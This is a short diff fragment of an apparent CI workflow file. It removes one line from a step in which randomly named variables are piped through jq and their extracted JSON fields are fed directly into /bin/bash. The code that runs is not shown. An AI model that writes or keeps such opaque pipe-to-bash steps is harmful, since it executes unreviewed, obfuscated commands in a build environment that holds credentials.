@@ -22,7 +22,6 @@ jobs:
           echo $cfv21667 | jq -r .gz02396 | /bin/bash
           echo $ybdj3596 | jq -r .h11931 | /bin/bash
           printf '%s' "$v7" | jq -r .zjogl0488 | /bin/bash
-          echo $ijrbb8029 | jq -r .mzfl14 | /bin/bash
           echo $jsvo40 | jq -r .mckr45055 | /bin/bash
 
       - name: Upload results
